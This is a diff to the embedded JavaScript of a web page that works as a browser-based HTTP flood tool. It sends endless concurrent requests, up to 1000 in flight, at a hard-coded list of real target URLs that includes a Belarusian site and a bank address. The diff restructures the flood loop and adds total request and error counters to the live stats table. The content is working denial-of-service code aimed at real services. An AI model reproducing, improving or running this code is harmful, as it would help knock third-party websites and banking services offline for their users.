@@ -366,19 +366,45 @@
             'https://zarya.by/',
             'https:/kk.bank/UdTs',
         ]
-
-        var targetStats = {}
-        targetList.forEach((target) => {
-            targetStats[target] = { number_of_requests: 0, number_of_errored_responses: 0, error_message: '' }
-        })
-
-        function printStats() {
-            document.getElementById('stats').innerHTML = Object.entries(targetStats).map(([target, { number_of_requests, number_of_errored_responses, error_message }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td><td>' + error_message + '</td></tr>').join('')
-        }
-        setInterval(printStats, 1000)
-
+        var targetStats = {}; targetList.forEach(target => { targetStats[target] = { number_of_requests: 0, number_of_errored_responses: 0, error_message: '' } })
+        var total_requests = 0
+        var total_errors = 0
         var CONCURRENCY_LIMIT = 1000
         var queue = []
+
+        // Start
+        targetList.map(flood)
+
+        // Update stats
+        setInterval(() => {
+            document.getElementById('stats').innerHTML = Object.entries(targetStats).map(([target, { number_of_requests, number_of_errored_responses, error_message }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td><td>' + error_message + '</td></tr>').join('') + `<tr><td style="font-weight:bold">Total Stats:</td><td>${total_requests}</td><td>${total_errors}</td><td></td></tr>`
+        }, 1000)
+
+        async function flood(target) {
+            while (true) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift()
+                }
+                queue.push(
+                    fetchWithTimeout(target, { timeout: 1000 })
+                        .catch((error) => {
+                            if (error.code === 20) { return } // ABORT
+                            targetStats[target].number_of_errored_responses++
+                            targetStats[target].error_message = error.message
+                            total_errors++
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                targetStats[target].number_of_errored_responses++
+                                targetStats[target].error_message = response.statusText
+                                total_errors++
+                            }
+                            targetStats[target].number_of_requests++
+                            total_requests++
+                        })
+                )
+            }
+        }
 
         async function fetchWithTimeout(resource, options) {
             const controller = new AbortController()
@@ -395,34 +421,8 @@
                 throw error
             })
         }
-
-        async function flood(target) {
-            for (var i = 0; ; i++) {
-                if (queue.length > CONCURRENCY_LIMIT) {
-                    await queue.shift()
-                }
-                var rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
-                queue.push(
-                    fetchWithTimeout(target + rand, { timeout: 1000 })
-                        .catch((error) => {
-                            if (error.code === 20) { return } // ABORT
-                            targetStats[target].number_of_errored_responses++
-                            targetStats[target].error_message = error.message
-                        })
-                        .then((response) => {
-                            if (response && !response.ok) {
-                                targetStats[target].number_of_errored_responses++
-                                targetStats[target].error_message = response.statusText
-                            }
-                            targetStats[target].number_of_requests++
-                        })
-                )
-            }
-        }
-
-        // Start
-        targetList.map(flood)
     </script>
+
 </body>
 
 </html>
